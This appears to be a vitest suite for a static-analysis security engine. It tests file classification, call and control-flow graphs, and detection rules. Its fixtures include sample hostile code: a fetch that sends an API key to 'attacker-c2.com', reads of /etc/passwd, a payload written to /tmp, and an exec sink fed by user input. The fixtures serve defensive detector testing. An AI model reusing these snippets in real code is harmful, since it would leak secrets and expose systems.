/**
 * P15 — Static Analysis & Control Flow Test Suite
 */

import { describe, it, expect } from 'vitest';
import { 
  StaticAnalysisEngine, 
  StaticFileSelector, 
  StaticSymbolGraphBuilder, 
  StaticCallGraphBuilder, 
  StaticCfgBuilder,
  STATIC_ANALYSIS_ENGINE_VERSION,
  STATIC_RULESET_VERSION,
  StaticFinding
} from '../../workers/static-analysis/index.ts';

describe('P15 — Static Analysis & Control Flow Architecture', () => {
  it('verifies static analysis engine and ruleset versions', () => {
    expect(STATIC_ANALYSIS_ENGINE_VERSION).toBe('1.0.0');
    expect(STATIC_RULESET_VERSION).toBe('1.0.0');
    expect(StaticAnalysisEngine.ENGINE_VERSION).toBe('1.0.0');
  });

  describe('File Selection & Classification', () => {
    it('accurately includes source files and excludes lockfiles/binaries while detecting entrypoints', () => {
      const files = [
        { path: 'src/index.ts', content: 'export function main() {}' },
        { path: 'src/utils/math.ts', content: 'export const add = (a: number, b: number) => a + b;' },
        { path: 'src/__tests__/math.test.ts', content: 'test("add", () => {});' },
        { path: 'package-lock.json', content: '{"lockfileVersion": 3}' },
        { path: 'assets/logo.png', content: 'fake-png-binary-data' },
        { path: 'config/agent.yaml', content: 'name: test-agent' },
      ];

      const result = StaticFileSelector.selectFiles(files);

      expect(result.included_files.map(f => f.path)).toEqual([
        'src/index.ts',
        'src/utils/math.ts',
        'src/__tests__/math.test.ts',
        'config/agent.yaml',
      ]);

      expect(result.excluded_files.map(f => f.path)).toContain('package-lock.json');
      expect(result.excluded_files.map(f => f.path)).toContain('assets/logo.png');

      const indexFile = result.included_files.find(f => f.path === 'src/index.ts');
      expect(indexFile?.is_entrypoint).toBe(true);
      expect(indexFile?.role).toBe('SOURCE');

      const testFile = result.included_files.find(f => f.path === 'src/__tests__/math.test.ts');
      expect(testFile?.role).toBe('TEST');
    });
  });

  describe('Symbol / Import Graph & Call Graph Resolution', () => {
    it('resolves cross-file bindings and traces interprocedural call paths from entrypoint to sink', () => {
      const helperFile = `
        import { exec } from 'child_process';
        export function executePayload(cmd: string) {
          exec(cmd);
        }
      `;

      const mainFile = `
        import { executePayload } from './helper';

        export function handleUserRequest(rawInput: string) {
          executePayload(rawInput);
        }

        export function main() {
          handleUserRequest("id");
        }
      `;

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_interprocedural_test',
        files: [
          { path: 'src/helper.ts', content: helperFile },
          { path: 'src/main.ts', content: mainFile },
        ],
        entrypoints: ['src/main.ts'],
      });

      // 1. Verify symbol graph binding
      const binding = report.symbol_graph.cross_file_bindings.find(
        b => b.from_file === 'src/main.ts' && b.from_symbol === 'executePayload'
      );
      expect(binding).toBeDefined();
      expect(binding?.to_file).toBe('src/helper.ts');
      expect(binding?.is_resolved).toBe(true);

      // 2. Verify call graph
      const edges = report.call_graph.edges;
      expect(edges.length).toBeGreaterThanOrEqual(3);

      // 3. Verify process execution finding and interprocedural trace
      const execFinding = report.findings.find(f => f.rule_id === 'SA-PROC-001');
      expect(execFinding).toBeDefined();
      expect(execFinding?.source_span.file_path).toBe('src/helper.ts');
      expect(execFinding?.interprocedural_trace).toBeDefined();
      expect(execFinding?.interprocedural_trace?.length).toBeGreaterThanOrEqual(2);

      const traceFunctions = execFinding?.interprocedural_trace?.map(t => t.function_name);
      expect(traceFunctions).toContain('handleUserRequest');
      expect(traceFunctions).toContain('executePayload');
    });
  });

  describe('Control Flow Graph (CFG) Construction', () => {
    it('constructs basic blocks for branches, loops, exception handlers, and identifies dead code', () => {
      const complexFunctionCode = `
        export function processPayment(amount: number, retries: number) {
          if (amount <= 0) {
            throw new Error("Invalid amount");
          }

          let attempt = 0;
          while (attempt < retries) {
            try {
              return sendWire(amount);
            } catch (err) {
              attempt++;
            }
          }

          return false;
          console.log("Unreachable post-return statement");
        }
      `;

      const cfg = StaticCfgBuilder.buildCfg('src/payment.ts', 'processPayment', complexFunctionCode);

      expect(cfg.cyclomatic_complexity).toBeGreaterThanOrEqual(4); // entry + if + while + catch
      expect(cfg.loop_count).toBe(1);
      expect(cfg.exception_handlers_count).toBe(1);
      expect(cfg.has_unreachable_blocks).toBe(true);

      const deadBlock = cfg.blocks.find(b => b.is_dead_code);
      expect(deadBlock).toBeDefined();
      expect(deadBlock?.statements.some(s => s.includes('Unreachable post-return'))).toBe(true);

      const ifBranchBlock = cfg.blocks.find(b => b.label.includes('THEN_BRANCH'));
      expect(ifBranchBlock).toBeDefined();

      const loopHeader = cfg.blocks.find(b => b.terminator_kind === 'LOOP_HEADER');
      expect(loopHeader).toBeDefined();
    });
  });

  describe('Golden Fixtures — Precision & Recall Baseline', () => {
    it('detects all known positive risks with zero false negatives (100% recall)', () => {
      const polyglotRiskFiles = [
        {
          path: 'src/network_exfil.ts',
          content: `
            import fetch from 'node-fetch';
            const apiKey = 'sk-proj1234567890abcdef1234567890';
            export async function exfiltrate() {
              await fetch('https://attacker-c2.com/steal?key=' + apiKey);
            }
          `,
        },
        {
          path: 'src/fs_traversal.ts',
          content: `
            import fs from 'fs';
            export function readShadow() {
              return fs.readFileSync('/etc/passwd', 'utf8');
            }
            export function dropPayload(data: string) {
              fs.writeFileSync('/tmp/payload.sh', data);
            }
          `,
        },
        {
          path: 'src/tools/mcp.ts',
          content: `
            export const runShellTool = {
              name: "run_shell",
              description: "Executes shell commands",
              inputSchema: { type: "object", properties: { cmd: { type: "string" } } }
            };
          `,
        },
      ];

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_golden_positive',
        files: polyglotRiskFiles,
      });

      const ruleIds = report.findings.map(f => f.rule_id);

      // SA-NET-001 (Fetch Egress)
      expect(ruleIds).toContain('SA-NET-001');
      // SA-NET-002 (Hardcoded URL)
      expect(ruleIds).toContain('SA-NET-002');
      // SA-CRED-001 (Hardcoded Secret sk-...)
      expect(ruleIds).toContain('SA-CRED-001');
      // SA-FS-001 (Sensitive Path /etc/passwd)
      expect(ruleIds).toContain('SA-FS-001');
      // SA-FS-002 (File write)
      expect(ruleIds).toContain('SA-FS-002');
      // SA-FS-003 (File read)
      expect(ruleIds).toContain('SA-FS-003');
      // SA-TOOL-001 (MCP Tool Declaration)
      expect(ruleIds).toContain('SA-TOOL-001');
    });

    it('produces zero security risk findings for benign clean code (100% precision)', () => {
      const benignFiles = [
        {
          path: 'src/calculator.ts',
          content: `
            export function add(a: number, b: number): number {
              return a + b;
            }
            export function multiply(a: number, b: number): number {
              return a * b;
            }
          `,
        },
        {
          path: 'src/types.ts',
          content: `
            export interface UserProfile {
              id: string;
              username: string;
              score: number;
            }
          `,
        },
      ];

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_golden_benign',
        files: benignFiles,
      });

      // No critical or high severity security findings
      const highOrCriticalFindings = report.findings.filter(
        f => f.severity === 'CRITICAL' || f.severity === 'HIGH'
      );
      expect(highOrCriticalFindings.length).toBe(0);
      expect(report.summary_stats.process_executions).toBe(0);
      expect(report.summary_stats.network_calls).toBe(0);
      expect(report.summary_stats.filesystem_calls).toBe(0);
      expect(report.summary_stats.credentials_detected).toBe(0);
    });

    it('strictly guarantees every source finding has a valid, non-empty SourceSpan with line numbers', () => {
      const testCode = `
        import { exec } from 'child_process';
        import fs from 'fs';

        export function testAll() {
          exec('ls -la');
          fs.writeFileSync('out.txt', 'done');
          const secret = process.env.API_KEY;
        }
      `;

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_span_verification',
        files: [{ path: 'src/test.ts', content: testCode }],
      });

      expect(report.findings.length).toBeGreaterThanOrEqual(3);

      for (const finding of report.findings) {
        expect(finding.source_span).toBeDefined();
        expect(finding.source_span.file_path).toBe('src/test.ts');
        expect(finding.source_span.start_line).toBeGreaterThanOrEqual(1);
        expect(finding.source_span.end_line).toBeGreaterThanOrEqual(finding.source_span.start_line);
        expect(finding.source_span.text_slice).toBeDefined();
        expect(finding.source_span.text_slice.length).toBeGreaterThan(0);
        expect(finding.stage_run.stage_name).toBe('STATIC_ANALYSIS');
        expect(finding.stage_run.engine_version).toBe('1.0.0');
      }
    });
  });
});
